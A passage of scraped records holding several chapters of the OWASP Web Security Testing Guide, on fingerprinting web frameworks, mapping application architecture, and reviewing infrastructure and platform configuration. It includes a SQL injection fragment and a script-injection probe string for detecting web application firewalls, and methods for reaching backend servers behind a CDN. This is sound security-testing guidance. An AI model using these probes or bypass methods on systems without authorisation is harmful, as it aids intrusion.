notable example is the [FuzzDB wordlists of predictable files/folders](https://github.com/fuzzdb-project/fuzzdb).\n\n#### File Extensions\n\nURLs may include file extensions that can also help identify the web platform or technology.\n\nFor example, the OWASP wiki used PHP:\n\n```text\nhttps://wiki.owasp.org/index.php?title=Fingerprint_Web_Application_Framework&action=edit&section=4\n```\n\nHere are some common web file extensions and associated technologies:\n\n- `.php` -- PHP\n- `.aspx` -- Microsoft ASP.NET\n- `.jsp` -- Java Server Pages\n\n#### Error Messages\n\nAs can be seen in the following screenshot the listed file system path points to use of WordPress (`wp-content`). Also, testers should be aware that WordPress is PHP-based (`functions.php`).\n\n![WordPress Parse error](images/wp-syntaxerror.png)\\\n*Figure 4.1.8-7: WordPress Parse Error*\n\n## Common Identifiers\n\n### Cookies\n\n| Framework    | Cookie name                       |\n|--------------|-----------------------------------|\n| Zope         | zope3                             |\n| CakePHP      | cakephp                           |\n| Kohana       | kohanasession                     |\n| Laravel      | laravel_session                   |\n| phpBB        | phpbb3_                           |\n| WordPress    | wp-settings                       |\n| 1C-Bitrix    | BITRIX_                           |\n| AMPcms       | AMP                               |\n| Django CMS   | django                            |\n| DotNetNuke   | DotNetNukeAnonymous               |\n| e107         | e107_tz                           |\n| EPiServer    | EPiTrace, EPiServer               |\n| Graffiti CMS | graffitibot                       |\n| Hotaru CMS   | hotaru_mobile                     |\n| ImpressCMS   | ICMSession                        |\n| Indico       | MAKACSESSION                      |\n| InstantCMS   | InstantCMS[logdate]               |\n| Kentico CMS  | CMSPreferredCulture               |\n| MODx         | SN4[12symb]                       |\n| TYPO3        | fe_typo_user                      |\n| Dynamicweb   | Dynamicweb                        |\n| LEPTON       | lep[some_numeric_value]+sessionid |\n| Wix          | Domain=.wix.com                   |\n| VIVVO        | VivvoSessionId                    |\n\n### HTML Source Code\n\n| Application | Keyword                                                                        |\n|-------------|--------------------------------------------------------------------------------|\n| WordPress   | `<meta name=\"generator\" content=\"WordPress 3.9.2\" />`                          |\n| phpBB       | `<body id=\"phpbb\"`                                                             |\n| Mediawiki   | `<meta name=\"generator\" content=\"MediaWiki 1.21.9\" />`                         |\n| Joomla      | `<meta name=\"generator\" content=\"Joomla! - Open Source Content Management\" />` |\n| Drupal      | `<meta name=\"Generator\" content=\"Drupal 7 (https://drupal.org)\" />`             |\n| DotNetNuke  | `DNN Platform - [https://www.dnnsoftware.com](https://www.dnnsoftware.com)`      |\n\n#### General Markers\n\n- `%framework_name%`\n- `powered by`\n- `built upon`\n- `running`\n\n#### Specific Markers\n\n| Framework         | Keyword                        |\n|-------------------|--------------------------------|\n| Adobe ColdFusion  | `<!-- START headerTags.cfm` |\n| Microsoft ASP.NET | `__VIEWSTATE`                  |\n| ZK                | `<!-- ZK`                   |\n| Business Catalyst | `<!-- BC_OBNW -->`       |\n| Indexhibit        | `ndxz-studio`                  |\n\n## Remediation\n\nWhile efforts can be made to use different cookie names (through changing configs), hiding or changing file/directory paths (through rewriting or source code changes), removing known headers, etc., such efforts boil down to \"security through obscurity\". System owners/administrators should recognize that such efforts only slow down the most rudimentary adversaries. The time and effort might be better spent on increasing stakeholder awareness and maintaining solutions.\n\n## Tools\n\nA list of general and well-known tools is presented below. There are also a lot of other utilities, as well as framework-based fingerprinting tools.\n\n### WhatWeb\n\nWebsite: [https://github.com/urbanadventurer/WhatWeb](https://github.com/urbanadventurer/WhatWeb)\n\nWhatWeb is one of the best open source fingerprinting tools currently available on the market and is included in the default [Kali Linux](https://www.kali.org/) build. Language: Ruby Matches for fingerprinting are made with:\n\n- Text strings (case sensitive)\n- Regular expressions\n- Google Hack Database queries (limited set of keywords)\n- MD5 hashes\n- URL recognition\n- HTML tag patterns\n- Custom ruby code for passive and aggressive operations\n\nSample output is presented on a screenshot below:\n\n![Whatweb Output sample](images/Whatweb-sample.png)\\\n*Figure 4.1.8-8: Whatweb Output sample*\n\n### Wappalyzer\n\nWebsite: [https://www.wappalyzer.com/](https://www.wappalyzer.com/)\n\nWappalyzer is available in multiple usage models, the most popular of which is likely the Firefox/Chrome extensions. They work largely on regular expression matching and don't need anything beyond the page being loaded in a browser. It works completely at the browser level and gives results in the form of icons. Although sometimes it has false positives, this is very handy to have notion of what technologies were used to construct a target site immediately after browsing a page.\n\nSample output of a plug-in is presented on a screenshot below.\n\n![Wappalyzer Output for OWASP Website](images/Owasp-wappalyzer.png)\\\n*Figure 4.1.8-9: Wappalyzer Output for OWASP site*\n\n## References\n\n### Whitepapers\n\n- [Saumil Shah: \"An Introduction to HTTP fingerprinting\"](https://web.archive.org/web/20190526182734/https://net-square.com/httprint_paper.html)\n- [Anant Shrivastava : \"Web Application Finger Printing\"](https://anantshri.info/articles/web_app_finger_printing.html)\n", "timestamp": "2025-10-24T11:39:42.913573"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/01-Information_Gathering/10-Map_Application_Architecture.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/10-Map_Application_Architecture.md", "content": "# Map Application Architecture\n\n|ID          |\n|------------|\n|WSTG-INFO-10|\n\n## Summary\n\nIn order to effectively test an application, and to be able to provide meaningful recommendations on how to address any of the issues identified, it is important to understand what one is actually testing. Additionally, it could be helpful to determine whether specific components should be considered out-of-scope for testing.\n\nModern web applications can vary significantly in complexity, from a simple script running on a single server to a highly complex application spread across dozens of different systems, languages and components. There may also be additional network-level components such as firewalls or intrusion protection systems that can have a significant impact on testing.\n\n## Test Objectives\n\n- Understand the architecture of the application and the technologies in use.\n\n## How to Test\n\nWhen testing from a black box perspective, it is important to try and build a clear picture of how the application works, and which technologies and components are in place. In some cases, it is possible to test for specific components such as a web application firewall, while other components can be identified by inspecting the behavior of the application.\n\nThe sections below provide a high-level overview of common architectural components, along with details on how they can be identified.\n\n### Application Components\n\n#### Web Server\n\nSimple applications may run on a single server, which can be identified using the steps discussed in the [Fingerprint Web Server](02-Fingerprint_Web_Server.md) section of the guide.\n\n#### Platform-as-a-Service (PaaS)\n\nIn a Platform-as-a-Service (PaaS) model, the web server and underlying infrastructure are managed by the service provider, and the customer is only responsible for the application that is deployed on them. From a testing perspective, there are two main differences:\n\n- The application owner has no access to the underlying infrastructure, which means they will be unable to directly remediate any issues\n- Infrastructure testing is likely to be out-of-scope for any engagements\n\nIn some cases, it is possible to identify the use of PaaS, as the application may use a specific domain name (for example, applications deployed on Azure App Services will have a `*.azurewebsites.net` domain - although they may also use custom domains). In other cases, it is difficult to determine whether PaaS is in use.\n\n#### Serverless\n\nIn a Serverless model, the developers provide code which is directly run on a hosting platform as individual functions, rather than running a traditional larger web application deployed in a webroot. This makes it well suited for microservice-based architecture. As with a PaaS environment, infrastructure testing is likely to be out-of-scope.\n\nIn some cases, the use of Serverless code may be indicated by the presence of specific HTTP headers. For example, AWS Lambda functions will typically return the following headers:\n\n```http\nX-Amz-Invocation-Type\nX-Amz-Log-Type\nX-Amz-Client-Context\n```\n\nAzure Functions are less obvious. They typically return the `Server: Kestrel` header - but this on its own is not enough to determine that it is an Azure App function, as it could be some other code running on Kestrel.\n\n#### Microservices\n\nIn a microservice-based architecture, the application API is made up of multiple discrete services, instead of being run as a monolithic application. The services themselves often run inside containers (usually with Kubernetes), and can use a variety of different operating systems and languages. Although they are typically behind a single API gateway and domain, the use of multiple languages (often indicated in detailed error messages) can suggest that microservices are in use.\n\n#### Static Storage\n\nMany applications store static content on dedicated storage platforms, rather than hosting it directly on the main web server. The two most common platforms are Amazon's S3 Buckets, and Azure's Storage Accounts, and can be easily identified by the domain names:\n\n- `BUCKET.s3.amazonaws.com` or `s3.REGION.amazonaws.com/BUCKET` for Amazon S3 Buckets\n- `ACCOUNT.blob.core.windows.net` for Azure Storage Accounts\n\nThese storage accounts can often expose sensitive files, as discussed in the [Testing Cloud Storage Guide](../02-Configuration_and_Deployment_Management_Testing/11-Test_Cloud_Storage.md) section.\n\n#### Database\n\nMost non-trivial web applications use some kind of database to store dynamic content. In some cases, it's possible to determine the database. This can often be done by:\n\n- Port scanning the server and looking for any open ports associated with specific databases\n- Triggering SQL (or NoSQL) related error messages (or finding existing errors from a [search engine](../01-Information_Gathering/01-Conduct_Search_Engine_Discovery_Reconnaissance_for_Information_Leakage.md)\n\nWhen it's not possible to conclusively determine the database, the tester can often make an educated guess based on other aspects of the application:\n\n- Windows, IIS and ASP.NET often use Microsoft SQL server\n- Embedded systems often use SQLite\n- PHP often uses MySQL or PostgreSQL\n- APEX often uses Oracle\n\nThese are not hard rules, but can certainly give you a reasonable starting point if no better information is available.\n\n#### Authentication\n\nMost applications have user authentication. There are multiple authentication backends that can be used, such as:\n\n- Web server configuration (including `.htaccess` files) or hard-coding passwords in scripts\n    - Usually shows up as HTTP Basic authentication, indicated by a pop-up in the browser and a `WWW-Authenticate: Basic` HTTP header\n- Local user accounts in a database\n    - Usually integrated into a form or API endpoint on the application\n- An existing central authentication source such as Active Directory or an LDAP server\n    - May use NTLM authentication, indicated by a `WWW-Authenticate: NTLM` HTTP header\n    - May be integrated into the web application in a form\n    - May require the username to be entered in the \"DOMAIN\\username\" format, or may give a dropdown of available domains\n- Single Sign-On (SSO) with either an internal or external provider\n    - Typically uses OAuth, OpenID Connect, or SAML\n\nApplications may provide multiple options for the user to authenticate (such as registering a local account, or using their existing Facebook account), and may use different mechanisms for normal users and administrators.\n\n#### Third Party Services and APIs\n\nAlmost all web applications include third party resources that are loaded or that the client interacts with. These can include:\n\n- [Active content](https://developer.mozilla.org/en-US/docs/Web/Security/Mixed_content#mixed_active_content) (such as scripts, style sheets, fonts, and iframes)\n- [Passive content](https://developer.mozilla.org/en-US/docs/Web/Security/Mixed_content#mixed_passivedisplay_content) (such as images and videos)\n- External APIs\n- Social media buttons\n- Advertising networks\n- Payment gateways\n\nThese resources are requested directly by the user's browser, making them easier to identify using the developer tools, or an intercepting proxy. While it is important to identify them (as they can impact the security of the application), remember that *they are usually out-of-scope for testing*, as they belong to third parties.\n\n### Network Components\n\n#### Reverse Proxy\n\nA reverse proxy sits in front of one or more backend servers and redirects requests to the appropriate destination. They can be used to implement various functionality, such as:\n\n- Acting as a [load balancer](#load-balancer) or [web application firewall](#web-application-firewall-waf)\n- Allowing multiple applications to be hosted on a single IP address or domain (in subfolders)\n- Implementing IP filtering or other restrictions\n- Caching content from the backend to improve performance\n\nIt is not always possible to detect a reverse proxy (especially if there is only a single application behind it), but you can sometimes identify it by:\n\n- A mismatch between the frontend server and the backend application (such as a `Server: nginx` header with an ASP.NET application)\n    - This can sometimes lead to [request smuggling vulnerabilities](https://portswigger.net/web-security/request-smuggling)\n- Duplicate headers (especially the `Server` header)\n- Multiple applications hosted on the same IP address or domain (especially if they use different languages)\n\n#### Load Balancer\n\nA load balancer sits in front of multiple backend servers and allocates requests between them in order to provide greater redundancy and processing capacity for the application.\n\nLoad balancers can be difficult to detect, but can sometimes be identified by making multiple requests and examining the responses for differences, such as:\n\n- Inconsistent system times\n- Different internal IP addresses or hostnames in detailed error messages\n- Different addresses returned from [Server-Side Request Forgery (SSRF)](../07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery.md)\n\nThey may also be indicated by the presence of specific cookies (for example, F5 BIG-IP load balancers will create a cookie called `BIGipServer`.\n\n#### Content Delivery Network (CDN)\n\nA Content Delivery Network (CDN) is a geographically distributed set of caching proxy servers designed to improve site performance.\n\nIt is typically configured by pointing the publicly facing domain to the CDN's servers, and then configuring the CDN to connect to the correct backend servers (sometimes known as the \"origin\").\n\nThe easiest way to detect a CDN is to perform a WHOIS lookup for the IP addresses that the domain resolves to. If they belong to a CDN company (such as Akamai, Cloudflare or Fastly - see [Wikipedia](https://en.wikipedia.org/wiki/Content_delivery_network#Notable_content_delivery_service_providers) for a more complete list), it is then likely that a CDN is in use.\n\nWhen testing a site behind a CDN, you should bear in mind the following points:\n\n- The IP addresses and servers belong to the CDN provider, and are likely to be out-of-scope for infrastructure testing\n- Many CDNs also include features such as bot detection, rate limiting, and web application firewalls\n- CDNs usually cache content. Therefore, changes made in the backend may not appear immediately on the site.\n\nIf the site is behind a CDN, it could be useful to identify the backend servers. If proper access control is not enforced, the tester may be able to bypass the CDN (and any protections it offers) by directly accessing the backend servers. There are a variety of different methods that may allow one to identify the backend system:\n\n- Emails sent by the application may come direct from the backend server, which could reveal it's IP address\n- DNS grinding, zone transfers or certificate transparency lists for a domain may reveal it on a subdomain\n- Scanning the IP ranges known to be used by the company may help identify the backend server\n- Exploiting [Server-Side Request Forgery (SSRF)](../07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery.md) may reveal the IP address\n- Detailed error messages from the application may expose IP addresses or hostnames\n\n### Security Components\n\n#### Network Firewall\n\nMost web servers will be protected by a packet filtering or stateful inspection firewall, which blocks any network traffic that is not required. To detect this, perform a port scan of the server and examine the results.\n\nIf the majority of the ports are shown as \"closed\" (i.e, they return a `RST` packet in response to the initial `SYN` packet), this suggests that the server may not be protected by a firewall. If the ports are shown as \"filtered\" (i.e, no response is received when sending a `SYN` packet to an unused port), then a firewall is most likely to be in place.\n\nAdditionally, if inappropriate services are exposed to the world (such as SMTP, IMAP, MySQL, etc), this suggests that either there is no firewall in place, or that the firewall is badly configured.\n\n#### Network Intrusion Detection and Prevention System\n\nA network Intrusion Detection System (IDS) is designed to detect suspicious or malicious network-level activity, such as port or vulnerability scanning, and raise alerts. An Intrusion Prevention System (IPS) functions similarly, but also takes action to prevent the activity, usually by blocking the source IP address.\n\nAn IPS can usually be detected by running automated scanning tools (such as a port scanner) against the target, and seeing if the source IP is blocked. However, many application-level tools may not be detected by an IPS (especially if it doesn't decrypt TLS).\n\n#### Web Application Firewall (WAF)\n\nA Web Application Firewall (WAF) inspects the contents of HTTP requests and blocks those that appear to be suspicious or malicious. They can also be used to dynamically apply other controls such as CAPTCHA or rate limiting. They usually utilize a set of known bad signatures and regular expressions, such as the [OWASP Core Rule Set](https://owasp.org/www-project-modsecurity-core-rule-set/), to identify malicious traffic. WAFs can be effective at protecting against certain types of attacks such as SQL injection or cross-site scripting, but are less effective against other types such as access control or business logic related issues.\n\nA WAF can be deployed in multiple locations, including:\n\n- On the web server itself\n- On a separate virtual machine or hardware appliance\n- In the cloud, in front of the backend server\n\nBecause a WAF blocks malicious requests, it can be detected by adding common attack strings to parameters and observing whether or not they are blocked. For example, try adding a parameter called `foo` with a value such as `' UNION SELECT 1` or `><script>alert(1)</script>`. If these requests are blocked, it is likely that there may be a WAF in place. Additionally, the contents of the block pages may provide information about the specific technology that is in use. Finally, some WAFs may add cookies or HTTP headers to responses that can reveal their presence.\n\nIf a cloud-based WAF is in use, then it may be possible to bypass it by directly accessing the backend server, using the same methods discussed in the [Content Delivery Network](#content-delivery-network-cdn) section.\n", "timestamp": "2025-10-24T11:39:43.115619"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/01-Information_Gathering/README.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/README.md", "content": "# 4.1 Information Gathering\n\n4.1.1 [Conduct Search Engine Discovery Reconnaissance for Information Leakage](01-Conduct_Search_Engine_Discovery_Reconnaissance_for_Information_Leakage.md)\n\n4.1.2 [Fingerprint Web Server](02-Fingerprint_Web_Server.md)\n\n4.1.3 [Review Webserver Metafiles for Information Leakage](03-Review_Webserver_Metafiles_for_Information_Leakage.md)\n\n4.1.4 [Enumerate Applications on Webserver](04-Enumerate_Applications_on_Webserver.md)\n\n4.1.5 [Review Web Page Content for Information Leakage](05-Review_Web_Page_Content_for_Information_Leakage.md)\n\n4.1.6 [Identify Application Entry Points](06-Identify_Application_Entry_Points.md)\n\n4.1.7 [Map Execution Paths Through Application](07-Map_Execution_Paths_Through_Application.md)\n\n4.1.8 [Fingerprint Web Application Framework](08-Fingerprint_Web_Application_Framework.md)\n\n4.1.9 [Fingerprint Web Application](09-Fingerprint_Web_Application.md)\n\n4.1.10 [Map Application Architecture](10-Map_Application_Architecture.md)\n", "timestamp": "2025-10-24T11:39:43.231360"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/01-Test_Network_Infrastructure_Configuration.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/01-Test_Network_Infrastructure_Configuration.md", "content": "# Test Network Infrastructure Configuration\n\n|ID          |\n|------------|\n|WSTG-CONF-01|\n\n## Summary\n\nThe intrinsic complexity of interconnected and heterogeneous web server infrastructure, which can include hundreds of web applications, makes configuration management and review a fundamental step in testing and deploying every single application. It takes only a single vulnerability to undermine the security of the entire infrastructure, and even small and seemingly unimportant problems may evolve into severe risks for another application on the same server. In order to address these problems, it is of utmost importance to perform an in-depth review of configuration and known security issues, after having mapped the entire architecture.\n\nProper configuration management of the web server infrastructure is very important in order to preserve the security of the application itself. If elements such as the web server software, the backend database servers, or the authentication servers are not properly reviewed and secured, they might introduce undesired risks or introduce new vulnerabilities that might compromise the application itself.\n\nFor example, a web server vulnerability that would allow a remote attacker to disclose the source code of the application itself (a vulnerability that has arisen a number of times in both web servers and application servers) could compromise the application, as anonymous users could use the information disclosed in the source code to leverage attacks against the application or its users.\n\nThe following steps need to be taken to test the configuration management infrastructure:\n\n- The different elements that make up the infrastructure need to be determined in order to understand how they interact with a web application and how they affect its security.\n- All the elements of the infrastructure need to be reviewed in order to make sure that they don't contain any known vulnerabilities.\n- A review needs to be made of the administrative tools used to maintain all the different elements.\n- The authentication systems need to be reviewed in order to assure that they serve the needs of the application and that they cannot be manipulated by external users to leverage access.\n- A list of defined ports which are required for the application should be maintained and kept under change control.\n\nAfter having mapped the different elements that make up the infrastructure (see [Map Network and Application Architecture](../01-Information_Gathering/10-Map_Application_Architecture.md)), it is possible to review the configuration of each element founded and test for any known vulnerabilities.\n\n## Test Objectives\n\n- Review the applications' configurations set across the network and validate that they are not vulnerable.\n- Validate that used frameworks and systems are secure and not susceptible to known vulnerabilities due to unmaintained software or default settings and credentials.\n\n## How to Test\n\n### Known Server Vulnerabilities\n\nVulnerabilities in various areas of the application architecture, whether in the web server or the backend database, can severely compromise the application. For example, consider a server vulnerability that allows a remote, unauthenticated user to upload files to the web server or even replace existing files. This vulnerability could compromise the application, since a rogue user may be able to replace the application itself or introduce code that would affect the backend servers, as its application code would be run just like any other application.\n\nReviewing server vulnerabilities can be hard to do if the test needs to be done through a blind penetration test. In these cases, vulnerabilities need to be tested from a remote site, typically using an automated tool. However, testing for some vulnerabilities can have unpredictable results on the web server, and testing for others (like those directly involved in denial of service attacks) might not be possible due to the service downtime involved if the test was successful.\n\nSome automated tools will flag vulnerabilities depending on the version of the web server they retrieve. This leads to both false positives and false negatives. On one hand, if the web server version has been removed or obscured by the local site administrator the scan tool will not flag the server as vulnerable even if it is. On the other hand, if the vendor providing the software does not update the web server version when vulnerabilities are fixed, the scan tool will flag vulnerabilities that do not exist. The latter case is actually very common as some operating system vendors back port patches of security vulnerabilities to the software they provide in the operating system, but do not do a full upload to the latest software version. This happens in most GNU/Linux distributions such as Debian, Red Hat, and SuSE. In most cases, vulnerability scanning of an application architecture will only find vulnerabilities associated with the \"exposed\" elements of the architecture (such as the web server) and will usually be unable to find vulnerabilities associated to elements which are not directly exposed, such as the authentication backend, the backend database, or reverse proxies [1] in use.\n\nFinally, not all software vendors publicly disclose vulnerabilities, which means these weaknesses may not be registered within known vulnerability databases [2]. This information is only disclosed to customers or published through fixes that do not have accompanying advisories. This reduces the effectiveness of vulnerability scanning tools. Typically, vulnerability coverage of these tools will be very good for common products (such as the Apache web server, Microsoft IIS, or IBM's Lotus Domino) but will be lacking for lesser known products.\n\nThis is why reviewing vulnerabilities is best done when the tester is provided with internal information about the software, including versions, releases, and patches applied. With this information, the tester can retrieve data from the vendor and analyze potential vulnerabilities in the architecture, as well as their potential impact on the application. When possible, these vulnerabilities can be tested to determine their real effects and to detect if there might be any external elements (such as intrusion detection or prevention systems) that might reduce or negate the possibility of successful exploitation. Testers might even determine through a configuration review that the vulnerability is not actually present since it affects a software component that is not in use.\n\nIt is also worthwhile to note that vendors will sometimes silently fix vulnerabilities and make the fixes available with new software releases. Different vendors have varying release cycles that determine the support they may provide for older releases. A tester with detailed information about the software versions used by the architecture can analyse the risk associated with the use of old software releases that might be unsupported in the short term or are already unsupported. This is critical because if a vulnerability emerges in an unsupported older software version, the systems personnel may not be directly aware of it. No patches will be ever made available for it and advisories might not list that version as vulnerable as it is no longer supported. Even if they are aware of the vulnerability and the associated system risks, a full upgrade to a new software release will be necessary, potentially introducing significant downtime in the application architecture or necessitating application re-coding due to incompatibilities with the latest software version.\n\n### Administrative Tools\n\nAny web server infrastructure requires the existence of administrative tools to maintain and update the information used by the application. This information includes static content (web pages, graphic files), application source code, user authentication databases, etc. The type of administrative tools used can vary depending on the specific site, technology, or software in use. For example, some web servers will be managed using administrative interfaces which are themselves web servers (such as the iPlanet web server) or will be administrated by plain text configuration files (such as in the Apache case [3]) or use operating-system GUI tools (such as when using Microsoft's IIS server or ASP.Net).\n\nIn most cases, the server configuration is managed with various file maintenance tools, administered through FTP servers, WebDAV, network file systems (NFS, CIFS), or other mechanisms. Obviously, the operating system of the elements that make up the application architecture will also be managed using other tools. Applications may also contain embedded administrative interfaces for managing application data (users, content, etc.).\n\nAfter mapping the administrative interfaces used to manage different parts of the architecture, it is important to review them. If an attacker gains access to any of these interfaces, they could potentially compromise or damage the application architecture. To accomplish this, it's important to:\n\n- Determine the mechanisms that control access to these interfaces and their associated susceptibilities. This information may be available online.\n- Ensure that the default username and password are changed.\n\nSome companies choose not to manage all aspects of their web server applications and may delegate content management to other parties. This external company might provide only certain parts of the content (such as news updates or promotions), or it might completely manage the web server (including content and code). It is common to find administrative interfaces available from the internet in these situations, since using the internet is cheaper than providing a dedicated line that will connect the external company to the application infrastructure through a management-only interface. In such situations, it's crucial to test whether the administrative interfaces are vulnerable to attacks.\n\n## References\n\n- [1] WebSEAL, also known as Tivoli Authentication Manager, is a reverse proxy from IBM which is part of the Tivoli framework.\n- [2] Such as Symantec's Bugtraq, ISS' X-Force, or NIST's National Vulnerability Database (NVD).\n- [3] There are some GUI-based administration tools for Apache (like NetLoony) but they are not in widespread use yet.\n", "timestamp": "2025-10-24T11:39:43.803416"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/02-Test_Application_Platform_Configuration.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/02-Test_Application_Platform_Configuration.md", "content": "# Test Application Platform Configuration\n\n|ID          |\n|------------|\n|WSTG-CONF-02|\n\n## Summary\n\nProper configuration of the single elements that make up an application architecture is important in order to prevent mistakes that might compromise the security of the whole architecture.\n\nReviewing and testing configurations are critical tasks in creating and maintaining an architecture. This is because various systems often come with generic configurations, which may not align well with the tasks they're supposed to perform on the specific sites where they're installed.\n\nWhile the typical web and application server installation will contain a lot of functionality (like application examples, documentation, test pages), what is not essential should be removed before deployment to avoid post-install exploitation.\n\n## Test Objectives\n\n- Ensure that default and known files have been removed.\n- Validate that no debugging code or extensions are left in the production environments.\n- Review the logging mechanisms set in place for the application.\n\n## How to Test\n\n### Black-Box Testing\n\n#### Sample and Known Files and Directories\n\nIn a default installation, many web servers and application servers provide sample applications and files for the benefit of the developer, in order to test if the server is working properly right after installation. However, many default web server applications have later been known to be vulnerable. This was the case, for example, for CVE-1999-0449 (Denial of Service in IIS when the Exair sample site had been installed), CAN-2002-1744 (Directory traversal vulnerability in CodeBrws.asp in Microsoft IIS 5.0), CAN-2002-1630 (Use of sendmail.jsp in Oracle 9iAS), or CAN-2003-1172 (Directory traversal in the view-source sample in Apache’s Cocoon).\n\nCGI scanners, which include a detailed list of known files and directory samples provided by different web or application servers, might be a fast way to determine if these files are present. However, the only way to be really sure is to do a full review of the contents of the web server or application server, and determine whether they are related to the application itself or not.\n\n#### Comment Review\n\nIt is very common for programmers to add comments when developing large web-based applications. However, comments included inline in HTML code might reveal internal information that should not be available to an attacker. Sometimes, a part of the source code is commented out when a functionality is no longer required, but this comment is unintentionally leaked out to the HTML pages returned to the users.\n\nComment review should be done in order to determine if any information is being leaked through comments. This review can only be thoroughly done through an analysis of the web server's static and dynamic content, and through file searches. It can be useful to browse the site in an automatic or guided fashion, and store all the retrieved content. This retrieved content can then be searched in order to analyse any HTML comments available in the code.\n\n#### System Configuration\n\nVarious tools, documents, or checklists can be used to give IT and security professionals a detailed assessment of the target systems' conformance to various configuration baselines or benchmarks. Such tools include, but are not limited to, the following:\n\n- [CIS-CAT Lite](https://www.cisecurity.org/blog/introducing-cis-cat-lite/)\n- [Microsoft's Attack Surface Analyzer](https://github.com/microsoft/AttackSurfaceAnalyzer)\n- [NIST's National Checklist Program](https://nvd.nist.gov/ncp/repository)\n\n### Gray-Box Testing\n\n#### Configuration Review\n\nThe web server or application server configuration takes an important role in protecting the contents of the site and it must be carefully reviewed in order to spot common configuration mistakes. Obviously, the recommended configuration varies depending on the site policy, and the functionality that should be provided by the server software. In most cases, however, configuration guidelines (either provided by the software vendor or external parties) should be followed to determine if the server has been properly secured.\n\nIt is impossible to generically say how a server should be configured, however, some common guidelines should be taken into account:\n\n- Only enable server modules (ISAPI extensions in the case of IIS) that are needed for the application. This reduces the attack surface since the server is reduced in size and complexity as software modules are disabled. It also prevents vulnerabilities that might appear in the vendor software from affecting the site if they are only present in modules that have been already disabled.\n- Handle server errors (40x or 50x) with custom-made pages instead of with the default web server pages. Specifically make sure that any application errors will not be returned to the end user and that no code is leaked through these errors since it will help an attacker. It is actually very common to forget this point since developers do need this information in pre-production environments.\n- Make sure that the server software runs with minimized privileges in the operating system. This prevents an error in the server software from directly compromising the whole system, although an attacker could elevate privileges once running code as the web server.\n- Make sure the server software properly logs both legitimate access and errors.\n- Make sure that the server is configured to properly handle overloads and prevent Denial of Service attacks. Ensure that the server has been performance-tuned properly.\n- Never grant non-administrative identities (with the exception of `NT SERVICE\\WMSvc`) access to applicationHost.config, redirection.config, and administration.config (either Read or Write access). This includes `Network Service`, `IIS_IUSRS`, `IUSR`, or any custom identity used by IIS application pools. IIS worker processes are not meant to access any of these files directly.\n- Never share out applicationHost.config, redirection.config, and administration.config on the network. When using Shared Configuration, prefer to export applicationHost.config to another location (see the section titled \"Setting Permissions for Shared Configuration).\n- Keep in mind that all users can read .NET Framework `machine.config` and root `web.config` files by default. Do not store sensitive information in these files if it should be for administrator eyes only.\n- Encrypt sensitive information that should be read by the IIS worker processes only and not by other users on the machine.\n- Do not grant Write access to the identity that the Web server uses to access the shared `applicationHost.config`. This identity should have only Read access.\n- Use a separate identity to publish applicationHost.config to the share. Do not use this identity for configuring access to the shared configuration on the Web servers.\n- Use a strong password when exporting the encryption keys for use with shared -configuration.\n- Maintain restricted access to the share containing the shared configuration and encryption keys. If this share is compromised, an attacker will be able to read and write any IIS configuration for your Web servers, redirect traffic from your site to malicious sources, and in some cases gain control of all web servers by loading arbitrary code into IIS worker processes.\n- Consider protecting this share with firewall rules and IPsec policies to allow only the member web servers to connect.\n\n#### Logging\n\nLogging is an important asset of the security of an application architecture, since it can be used to detect flaws in applications (users constantly trying to retrieve a file that does not really exist) as well as sustained attacks from rogue users. Logs are typically properly generated by web and other server software. It is not common to find applications that properly log their actions to a log and, when they do, the main intention of the application logs is to produce debugging output that could be used by the programmer to analyze a particular error.\n\nIn both cases (server and application logs) several issues should be tested and analyzed based on the log contents:\n\n1. Do the logs contain sensitive information?\n2. Are the logs stored in a dedicated server?\n3. Can log usage generate a Denial of Service condition?\n4. How are they rotated? Are logs kept for the sufficient time?\n5. How are logs reviewed? Can administrators use these reviews to detect targeted attacks?\n6. How are log backups preserved?\n7. Is the data being logged data validated (min/max length, chars etc) prior to being logged?\n\n##### Sensitive Information in Logs\n\nSome applications might, for example, use GET requests to forward form data which can be seen in the server logs. This means that server logs might contain sensitive information (such as usernames and passwords, or bank account details). This sensitive information can be misused by an attacker if they obtained the logs, for example, through administrative interfaces or known web server vulnerabilities or misconfiguration (like the well-known `server-status` misconfiguration in Apache-based HTTP servers).\n\nEvent logs will often contain data that is useful to an attacker (information leakage) or can be used directly in exploits:\n\n- Debug information\n- Stack traces\n- Usernames\n- System component names\n- Internal IP addresses\n- Less sensitive personal data (e.g. email addresses, postal addresses and telephone numbers associated with named individuals)\n- Business data\n\nAlso, in some jurisdictions, storing some sensitive information in log files, such as personal data, might oblige the enterprise to apply the data protection laws that they would apply to their backend databases to log files too. And failure to do so, even unknowingly, might carry penalties under the data protection laws that apply.\n\nA wider list of sensitive information is:\n\n- Application source code\n- Session identification values\n- Access tokens\n- Sensitive personal data and some forms of personally identifiable information (PII)\n- Authentication passwords\n- Database connection strings\n- Encryption keys\n- Bank account or payment card holder data\n- Data of a higher security classification than the logging system is allowed to store\n- Commercially-sensitive information\n- Information it is illegal to collect in the relevant jurisdiction\n- Information a user has opted out of collection, or not consented to e.g. use of do not track, or where consent to collect has expired\n\n#### Log Location\n\nTypically servers will generate local logs of their actions and errors, consuming the disk of the system the server is running on. However, if the server is compromised, its logs can be wiped out by the intruder to clean up all the traces of its attack and methods. If this were to happen the system administrator would have no knowledge of how the attack occurred or where the attack source was located. Actually, most attacker tool kits include a \"log zapper\" that is capable of cleaning up any logs that hold given information (like the IP address of the attacker) and are routinely used in attacker’s system-level root kits.\n\nTherefore, it is wise to keep logs in a separate location and not on the web server itself. This also makes it easier to aggregate logs from different sources that refer to the same application (such as those of a web server farm) and it also makes it easier to do log analysis (which can be CPU intensive) without affecting the server itself.\n\n#### Log Storage\n\nImproper storage of logs 